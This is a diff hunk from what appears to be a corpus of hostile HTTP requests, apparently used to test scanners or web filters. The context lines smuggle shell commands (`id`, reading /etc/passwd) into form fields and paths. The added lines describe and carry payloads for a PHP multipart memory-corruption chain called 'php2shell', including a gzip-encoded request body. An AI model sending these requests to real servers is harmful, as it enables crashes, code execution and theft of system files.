@@ -4425,3 +4425,18 @@ POST /api/trust/cert/search header="Content-Type: application/x-www-form-urlenco
 POST /api/convert header="Content-Type: application/x-www-form-urlencoded" body="source=$(id).png&target=out.webp"
 POST /api/extract header="Content-Type: application/x-www-form-urlencoded" body="archive=report`id`.zip&target=/tmp/out"
 GET /download?path=uploads/$(cat%20/etc/passwd).mp4
+
+# --- CVE-2026-109618 / CVE-2026-109619 (PHP, "php2shell"): OOM-fatal memory
+#     corruption in the engine itself. Every published path forces a fatal
+#     while PHP parses a multipart form whose empty upload parts carry deeply
+#     nested field names: each level multiplies the $_FILES hierarchy for the
+#     six entries PHP builds, so a body below post_max_size exhausts the heap.
+#     The compressed variant breaks the declared-length check the same way.
+#     The last request of the chain (a multipart form with
+#     PHP_SESSION_UPLOAD_PROGRESS and no file part) only becomes an attack
+#     after the previous request primed the stale worker state, so it has no
+#     single-request line here; see the php2shell rows in the coverage notes.
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-nested-empty-file.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-nested-empty-file-min.txt
+POST /upload header="Content-Type: multipart/form-data; boundary=X" body_file=payloads/php2shell-nested-empty-file-reordered.txt
+POST /upload header="Content-Encoding: gzip" header="Content-Type: multipart/form-data; boundary=X" bodyhex=1f8b0800000000000203edcd310ac3300c05d0dde03b18efa27b42a7f6081d0ac683ea2820882d136be9ed8be9d0b117107ffb1ffe03787a7793a6d414ee3cba0c5696b6845dce0a1b2aaea161a56bdcf9a09130a7574e25a72dc735cceebbc6dfcde3dd6909d8fbc105e7d9458a92c2d093b07a3703e69a6baeb9e6fe7301bcfb009d6917d1a7050000
